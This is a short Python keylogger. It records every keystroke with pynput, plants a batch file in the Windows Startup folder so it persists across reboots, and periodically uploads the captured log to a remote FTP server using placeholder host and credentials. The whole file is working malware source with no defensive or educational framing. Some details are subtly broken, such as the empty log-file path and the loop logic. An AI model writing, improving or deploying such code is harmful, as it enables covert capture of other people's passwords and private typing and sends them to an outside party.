import ftplib
from pynput import keyboard
import time
import os
import sys

log_file = ""

def on_press(key):
    try:
        current = str(key.char)
    except AttributeError:
        if key == key.space:
            current = " "
        else:
            current = " " + str(key) + " "
    with open(log_file, "a") as f:
        f.write(current)
        f.flush()

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def upload_log():
    ftp = ftplib.FTP("ftp.example.com")
    ftp.login("username", "password")
    with open(log_file, "rb") as f:
        ftp.storbinary("STOR log.txt", f)
    ftp.quit()

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = os.path.join(os.environ["APPDATA"], "Microsoft\Windows\Start Menu\Programs\Startup")
    with open(os.path.join(bat_path, "open.bat"), "w+") as bat_file:
        bat_file.write(r'start "" {} {}'.format(sys.executable, file_path))

add_to_startup()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    while True:
        listener.join()
        time.sleep(900)
        upload_log()